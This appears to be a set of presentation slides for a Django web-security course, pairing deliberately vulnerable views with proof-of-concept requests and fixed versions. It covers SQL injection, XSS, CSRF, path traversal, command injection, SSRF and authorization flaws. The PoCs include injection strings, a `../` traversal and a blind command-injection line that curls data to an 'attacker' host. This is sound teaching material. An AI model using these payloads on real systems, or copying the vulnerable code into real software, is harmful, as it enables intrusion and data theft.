# Presentation Code Blocks - Part 1

These snippets are slide-friendly versions of the Part 1 demo code. They are intentionally shorter than the runnable source.

## SQL Injection

Principle:

> Keep user input as data, not query code.

### Safe Django ORM

```python
def sql_safe(request):
    q = request.GET.get("q", "")
    products = (
        Product.objects.filter(name__icontains=q)
        | Product.objects.filter(description__icontains=q)
    )
    return render(request, "sql.html", {"products": products})
```

### Vulnerable Raw SQL

```python
def sql_vulnerable(request):
    q = request.GET.get("q", "")
    sql = f"""
        SELECT id, name, owner, description
        FROM demos_product
        WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'
    """

    with connection.cursor() as cursor:
        cursor.execute(sql)
        rows = cursor.fetchall()
```

### PoC

```http
GET /part1/sql/vulnerable/?q=' OR 1=1 --
```

### Fixed Parameterized Query

```python
def sql_fixed(request):
    q = request.GET.get("q", "")
    sql = """
        SELECT id, name, owner, description
        FROM demos_product
        WHERE name LIKE %s OR description LIKE %s
    """
    pattern = f"%{q}%"

    with connection.cursor() as cursor:
        cursor.execute(sql, [pattern, pattern])
        rows = cursor.fetchall()
```

## XSS

Principle:

> User content should render as content, not code.

### Safe Django Template Rendering

```python
def xss_upload(request):
    if request.method == "POST":
        upload = request.FILES.get("upload")
        name = os.path.basename(upload.name)
        (XSS_UPLOAD_DIR / name).write(upload.read())
        return redirect(f"/part1/xss/preview/?name={name}")
    return render(request, "xss_upload.html", {"files": <uploaded files>})
```

```html
<form method="post" enctype="multipart/form-data">
  {% csrf_token %}
  <input type="file" name="upload">
  <button type="submit">Upload + preview</button>
</form>
```

### Vulnerable Trusted Preview

```python
from django.utils.safestring import mark_safe


def xss_preview_vulnerable(request):
    preview = (XSS_UPLOAD_DIR / name).read_text()
    rendered = mark_safe(preview)
    return render(request, "xss_preview.html", {"body": rendered})
```

### PoC

Upload `welcome.svg` containing `<script>alert(1)</script>`, then open the preview:

```http
GET /part1/xss/preview/?name=welcome.svg
```

### Fixed Escaped Preview

```python
from django.utils.html import format_html


def xss_preview_fixed(request):
    preview = (XSS_UPLOAD_DIR / name).read_text()
    rendered = format_html("{}", preview)
    return render(request, "xss_preview.html", {"body": rendered})
```

## CSRF

Principle:

> A logged-in browser is not proof that the user intentionally made the request.

### Protected Django Form

```python
@csrf_protect
def csrf_safe(request):
    if request.method == "POST":
        amount = int(request.POST["amount"])
        transfer_money(request.user, amount)
        return redirect("csrf_safe")

    return render(request, "csrf_form.html")
```

```html
<form method="post">
  {% csrf_token %}
  <input name="amount" value="10">
  <button type="submit">Transfer</button>
</form>
```

### Vulnerable CSRF-Exempt Endpoint

```python
@csrf_exempt
def csrf_vulnerable(request):
    if request.method == "POST":
        amount = int(request.POST["amount"])
        transfer_money(request.user, amount)
        return HttpResponse("done")
```

### PoC

```html
<form method="post" action="http://127.0.0.1:8000/part1/csrf/vulnerable/">
  <input type="hidden" name="amount" value="75">
</form>
<script>
  document.forms[0].submit();
</script>
```

### Fixed Endpoint

```python
@csrf_protect
def csrf_fixed(request):
    if request.method == "POST":
        amount = int(request.POST["amount"])
        transfer_money(request.user, amount)
        return redirect("csrf_fixed")

    return render(request, "csrf_form.html")
```

## CORS Clarification

Principle:

> CORS controls who can read responses in the browser; CSRF controls whether state-changing requests require user intent.

### The Common Confusion

```text
CSRF:
Can another site make the victim's browser send a request with their cookies?

CORS:
Can another site's JavaScript read the response?
```

### Dangerous Origin Reflection

```python
def add_cors_headers(response, request):
    origin = request.headers.get("Origin")

    if origin:
        response["Access-Control-Allow-Origin"] = origin
        response["Access-Control-Allow-Credentials"] = "true"

    return response
```

### Safer Explicit Allowlist

```python
ALLOWED_CORS_ORIGINS = {
    "https://app.example.test",
    "https://admin.example.test",
}


def add_cors_headers(response, request):
    origin = request.headers.get("Origin")

    if origin in ALLOWED_CORS_ORIGINS:
        response["Access-Control-Allow-Origin"] = origin
        response["Vary"] = "Origin"

    return response
```

### Discussion Prompt

```text
If CORS blocks reading the response, can the browser still send the request?
What changes if the endpoint changes state?
```

## Clickjacking

Principle:

> Some attacks trick the user into clicking the real app through a malicious frame.

### Django Middleware

```python
MIDDLEWARE = [
    # ...
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]
```

### Header Check

```http
GET /part1/clickjacking/protected/

HTTP/1.1 200 OK
X-Frame-Options: DENY
```

### Discussion Prompt

```text
What if the user is clicking the real app, but cannot see what they are clicking?
```

## Open Redirect / Host Trust

Principle:

> The user can request where to go next, but the server must decide whether that destination is allowed.

### Vulnerable Redirect

```python
def redirect_vulnerable(request):
    next_url = request.GET.get("next", "/")
    return redirect(next_url)
```

## Deployment Security Settings

Principle:

> Django has settings for browser and transport protections, but they only work when deployment matches the assumptions.

### HTTPS And Cookie Settings

```python
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

### Secret Key

```python
SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]
```

### Discussion Prompt

```text
Which protections are application code?
Which protections depend on deployment, proxy, TLS, and browser behavior?
```

### PoC

```http
GET /part1/redirect/vulnerable/?next=https://example.com
```

### Fixed Redirect

```python
from django.utils.http import url_has_allowed_host_and_scheme


def redirect_fixed(request):
    next_url = request.GET.get("next", "/")
    allowed = url_has_allowed_host_and_scheme(
        next_url,
        allowed_hosts={request.get_host()},
        require_https=request.is_secure(),
    )

    if not allowed:
        next_url = "/"

    return redirect(next_url)
```

## IDOR / Object Authorization Bridge

Principle:

> Authentication answers "who are you?" Authorization answers "should you access this specific object?"

### Vulnerable Shape

```python
def document_detail(request, document_id):
    document = Document.objects.get(id=document_id)
    return render(request, "document.html", {"document": document})
```

### Safer Ownership-Scoped Lookup

```python
def document_detail(request, document_id):
    document = get_object_or_404(
        Document,
        id=document_id,
        project__members=request.user,
    )
    return render(request, "document.html", {"document": document})
```

### Discussion Prompt

```text
Django knows who the user is.
Django does not know which project, invoice, document, namespace, or job belongs to them.
```

# Presentation Code Blocks - Part 2

These snippets are slide-friendly versions of the Part 2 integration demos.

## Path Traversal / Unsafe File Access

Principle:

> Users choose resources, not filesystem paths.

### Vulnerable File Read

```python
REPORT_DIR = BASE_DIR / "demo_files" / "reports"


def file_vulnerable(request):
    name = request.GET.get("name", "alice-summary.txt")
    path = REPORT_DIR / name
    content = path.read_text()
    return render(request, "result.html", {"result": content})
```

### PoC

```http
GET /part2/files/vulnerable/?name=../private/internal-note.txt
```

### Fixed Resource Lookup

```python
ALLOWED_REPORTS = {
    "alice-summary": "alice-summary.txt",
    "public-status": "public-status.txt",
}


def file_fixed(request):
    report_id = request.GET.get("report", "alice-summary")
    filename = ALLOWED_REPORTS.get(report_id)

    if filename is None:
        return HttpResponse("Unknown report", status=404)

    content = (REPORT_DIR / filename).read_text()
    return render(request, "result.html", {"result": content})
```

## Unsafe Subprocess Usage

Principle:

> Treat command execution as a privilege boundary.

### Vulnerable Shell Command

```python
def subprocess_vulnerable(request):
    target = request.GET.get("target", "api")
    command = f"echo checking-{target}"
    completed = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
    )
    return HttpResponse(completed.stdout + completed.stderr)
```

### PoC

```http
GET /part2/subprocess/vulnerable/?target=api; id #
```

### Blind Command Injection

```python
def subprocess_blind(request):
    target = request.GET.get("target", "api")
    command = f"echo checking-{target}"

    subprocess.run(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    return HttpResponse("Diagnostic accepted")
```

### Blind Callback PoC

```http
GET /part2/subprocess/blind/?target=api; curl -s http://attacker/capture?leak=demo #
```

### Blind Timing PoC

```bash
time curl 'http://127.0.0.1:8000/part2/subprocess/blind/?target=api%3B%20sleep%202%20%23'
```

### Fixed Argument List And Allowlist

```python
ALLOWED_DIAGNOSTIC_TARGETS = {"api", "worker", "database"}


def subprocess_fixed(request):
    target = request.GET.get("target", "api")

    if target not in ALLOWED_DIAGNOSTIC_TARGETS:
        return HttpResponse("Unknown diagnostic target", status=400)

    completed = subprocess.run(
        ["printf", "checking %s\n", target],
        capture_output=True,
        text=True,
    )
    return HttpResponse(completed.stdout + completed.stderr)
```

## Unsafe Outbound Fetch / Webhook Validation

Principle:

> A URL fetch is not just input validation; it is network delegation.

### Vulnerable Fetch

```python
def fetch_vulnerable(request):
    url = request.GET["url"]

    with urlopen(url, timeout=2) as response:
        body = response.read(500)

    return HttpResponse(body)
```

### PoC

```http
GET /part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/
```

### Fixed Fetch Policy

```python
ALLOWED_FETCH_PATHS = {"/part2/fetch/public-api/"}


def fetch_fixed(request):
    url = request.GET["url"]

    if not is_allowed_demo_fetch(url):
        return HttpResponse("Blocked by outbound fetch policy", status=400)

    with urlopen(url, timeout=2) as response:
        body = response.read(500)

    return HttpResponse(body)
```


## Unsafe Background Job / Task Parameters

Principle:

> Background work still needs authorization-aware inputs.

### Vulnerable Task Payload

```python
def task_vulnerable(request):
    action = request.GET.get("action", "export")
    document_id = request.GET["document_id"]
    enqueue_task(action=action, document_id=document_id)
```

### PoC

```http
GET /part2/tasks/vulnerable/?action=email_owner&document_id=2
```

### Fixed Server-Constructed Task

```python
def task_fixed(request):
    document = get_object_or_404(Document, owner=request.user.username)
    enqueue_task(action="export", document_id=document.id)
```

## Unsafe Privileged Integration

Principle:

> Do not let users freely steer privileged backend integrations.

### Vulnerable Privileged Action

```python
def privileged_vulnerable(request):
    user = request.GET.get("user", "alice")
    target_user = request.GET.get("target_user", user)
    action = request.GET.get("action", "restart")

    result = control_plane.perform(action, target_user)
    return HttpResponse(result)
```

### PoC

```http
GET /part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot
```

### Fixed Narrow Operation

```python
def privileged_fixed(request):
    user = request.GET.get("user", "alice")
    result = control_plane.perform("restart", user)
    return HttpResponse(result)
```

### Discussion Prompt

```text
The backend is allowed to do something.
The user is allowed to request some version of that thing.
Where exactly is the boundary?
```
